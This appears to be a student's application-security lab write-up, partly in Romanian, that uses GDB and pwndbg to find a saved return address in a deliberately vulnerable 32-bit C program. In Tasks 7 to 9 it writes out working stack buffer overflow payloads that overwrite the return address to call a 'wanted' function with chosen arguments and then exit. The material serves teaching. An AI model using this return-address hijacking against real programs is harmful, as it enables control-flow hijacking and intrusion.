# Lab 6 - Application Security

## Setup
```bash
sudo apt install libc6-dev-i386 gcc-multilib
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh

# to check everything is ok
gdb
# should look like this
# to exit press q
# GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
# ...
# pwndbg>

```

## Task 1
compile buggy.c

```bash
gcc buggy.c -o buggy -fno-stack-protector -m32 -g
```

## Task 2
Run the program using GDB, setting the argument Florin.

```bash
gdb buggy
```
Set a breakpoint at the beginning of the main function.
Continue execution until you hit the breakpoint.
```bash
break main
run Florin

#alternativ, se poate folosi start 
start
```

Try to reach the beginning of the copy function without setting another breakpoint.

```bash
n 
#de 3 ori

```

## Task 3

Remove the existing breakpoint and set a new one at the beginning of the copy function.

```bash
i b
d 1
i b
b copy
```

Run again the program and continue execution until you hit the breakpoint.

```bash
run Florin
```

Print the value and the address of name. Print the value again after gets(name) is executed.

```bash
x/s name
n
n
x/s name
```

## Task 4
```bash
start
x/s buff
# sau p &buff
# repeat
# adresa nu se schimba
```
```bash
show disable-randomization
set disable-randomization off
```

## Task 5

Restart gdb and run until the beginning of the copy function.

```bash
q
gdb buggy
b copy
set args Florin
run
```

At what address is name located?

```bash
p &name 
# sau x/s name
```

At what address is the saved return address located?
```shell
info frame
# adresa salvata in eip
```
# Task 6
* si mai simplu offf....
```bash
 p $ebp - name + 4
```

* din gbd output
    * adresa de return este sub ebp (ebp+4)
```c
─────────────────[ STACK ]──────────────────────────
00:0000│ esp 0xffffcb90 —▸ 0xf7fc4540 (__kernel_vsyscall) ◂— push ecx
01:0004│-014 0xffffcb94 ◂— 0x0
02:0008│-010 0xffffcb98 —▸ 0xf7dd8a99 (printf+9) ◂— add eax, 0x1d2567
03:000c│-00c 0xffffcb9c —▸ 0x565562c2 (main+96) ◂— add esp, 0x10
04:0010│-008 0xffffcba0 —▸ 0x5655705e ◂— '%s, %s\n'
05:0014│-004 0xffffcba4 —▸ 0x56558fcc (_GLOBAL_OFFSET_TABLE_) ◂— 0x3ed4
06:0018│ ebp 0xffffcba8 —▸ 0xffffcbc8 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 —▸ 0x56555000 ◂— ...
07:001c│+004 0xffffcbac —▸ 0x565562ca (main+104) ◂— sub esp, 0xc
```

sau se ia direct din info frame

```bash
i f
# Stack level 0, frame at 0xffffcbc0:
# eip = 0x56556229 in copy (buggy.c:16); saved eip = 0x565562ca
# called by frame at 0xffffcbf0
# source language c.
# Arglist at 0xffffcbb8, args:
# Locals at 0xffffcbb8, Previous frame's sp is 0xffffcbc0
# Saved registers:
#  ebx at 0xffffcbb4, ebp at 0xffffcbb8, eip at 0xffffcbbc
```
- name is at n_addr = 0xffffcb94
- return is at ret_addr = 0xffffcbac

Diferenta dintre cele 2 adrese = 0x18 => 24 

# Task 7
Call the ''wanted'' function.

What is the address of this function?

Adjust the input so that the return address is overwritten with the address of the wanted function.

```bash
print &wanted
# $2 = (void (*)(int)) 0x565561cd <wanted>
```

```bash
run args < <(python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 24 + b"\xcd\x61\x55\x56")')
```

# Task 8

Calling the "wanted" function with the correct arguments.

```bash
run args < <(python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 24 + b"\xcd\x61\x55\x56" + b"B" * 4 + b"\xBE\xBA\xFE\xCA")')
```

# Task 9

Adjust the previous payload so that the program exits without a segmentation fault.

```bash 
p &exit
# $4 = (void (*)(int)) 0xf7dbb460 <__GI_exit>
```

```bash
run args < <(python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 24 + b"\xcd\x61\x55\x56" + b"\x60\xb4\xdb\xf7" + b"\xBE\xBA\xFE\xCA")')
```